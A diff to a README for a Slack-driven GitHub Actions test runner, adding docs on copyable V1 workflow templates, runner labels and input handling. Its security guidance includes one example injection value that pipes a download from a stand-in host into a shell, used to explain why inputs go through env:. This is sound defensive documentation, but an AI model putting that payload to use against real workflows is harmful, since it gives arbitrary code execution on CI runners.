@@ -175,7 +175,10 @@ slack-runtests/
 ├── examples/                        # the two deployments, run for real in CI
 │   ├── standalone/                  #   A — own host, own port, SQLite
 │   ├── embedded/                    #   B — sidecar, no port, Postgres
-│   └── verify.sh                    #   brings both up and checks them
+│   ├── verify.sh                    #   brings both up and checks them
+│   └── workflows/                   #   V1 templates to COPY into a product repo
+│       ├── runtests-node.yml
+│       └── runtests-python.yml
 ├── .github/workflows/runtests.yml   # the action V2 dispatches
 └── tests/
     ├── unit/                        # this project's gate
@@ -198,6 +201,68 @@ out of it; the runner still reaches it by naming the product directory inside,
 so collection starts below the excluded name. Verified in both directions:
 removing the entry makes `pytest tests/integration` collect 8 tests rather than
 the tier's own.
+
+## The workflow a product repo needs (V1)
+
+`examples/workflows/` holds two files to **copy into a product repository**, at
+`.github/workflows/<name>`. They are inert here — they are templates, not this
+project's own CI.
+
+| language | file | install | run |
+| --- | --- | --- | --- |
+| Python | `runtests-python.yml` | `uv sync --frozen` | `uv run pytest` |
+| Node | `runtests-node.yml` | `npm ci` | `npm test` |
+
+**The filenames are not decoration.** `slack_runtests.store.base.DEFAULT_WORKFLOW`
+maps a job definition's `language` to one of these exact names, so renaming one
+breaks dispatch with no local symptom — the edge asks GitHub for a workflow that
+is not there. `tests/unit/test_workflow_templates.py` asserts a template exists
+for every language the mapping can produce, so adding a language starts
+demanding its template.
+
+### These are V1. `.github/workflows/runtests.yml` is V2, and copying it is the mistake
+
+The file in this repository's own `.github/workflows/` parks work for an
+**enrolled self-hosted runner** that picks it up by polling:
+
+```yaml
+runs-on: [self-hosted, linux, testlab]
+```
+
+V1 is the opposite — the edge dispatches and **waits** — so the templates run on
+`ubuntu-latest`. A product repo carrying the V2 file gets a workflow that
+**queues forever** against a runner label nothing answers to, and the symptom is
+a job that never *starts* rather than one that fails. Both directions are pinned
+by tests: the templates must be hosted, and the V2 file must stay self-hosted so
+nobody "corrects" it.
+
+### Two things every template must keep
+
+**Declare every input the edge sends, including the ones it ignores.** An
+undeclared input is a **422**, which reads as a GitHub fault rather than as a
+workflow one line out of date. The test compares the declarations against
+`runners/github.py`'s own dict — read from the source, not restated — and first
+asserts that dict was readable at all, so a parser that matched nothing cannot
+make the comparison pass over an empty set.
+
+**Inputs reach `run:` blocks through `env:`, NEVER by `${{ }}` interpolation.**
+GitHub substitutes textually, before any shell parses it, so
+`pytest -k ${{ inputs.select }}` with a value of `smoke"; curl evil.sh | sh; "`
+is arbitrary code execution on the runner. The regex in `parsing.py` is the
+second lock on the same door; keep both. The test checks the **parsed
+document**, not the file text, so the comments that explain the hazard — and
+therefore contain the dangerous form — cannot make it pass or fail for the
+wrong reason.
+
+### Not yet piloted
+
+No template has been dispatched from a real `/testauto` yet, so **these are
+unproven end to end**. Two pilots — one Node, one Python — come before any
+sweep across the fleet: a template rolled into twenty repos before a single real
+dispatch has been observed is twenty PRs to redo. A pilot needs a deployed edge
+holding `GITHUB_TOKEN` and `GITHUB_REPO` (the `stonedogcode/prod` secret carries
+neither today) and somebody to type the command, so it is not something this
+repository can do to itself.
 
 ## Security — the half that is most of it
 
